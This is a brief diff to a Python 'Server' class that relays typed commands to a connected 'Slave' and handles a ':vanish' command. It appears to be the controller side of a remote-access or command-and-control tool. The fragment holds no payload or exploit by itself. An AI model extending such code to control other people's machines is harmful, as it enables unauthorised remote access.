@@ -33,7 +33,7 @@ class Server(object):
                 cmd = input(self.__decode(conn.recv(1024)))
                 conn.send(self.__encode(cmd))
                 if cmd == ':vanish':
-                    print('Slave vanished.\n')
+                    print(self.__decode(conn.recv(1024)))
                     break
 
 
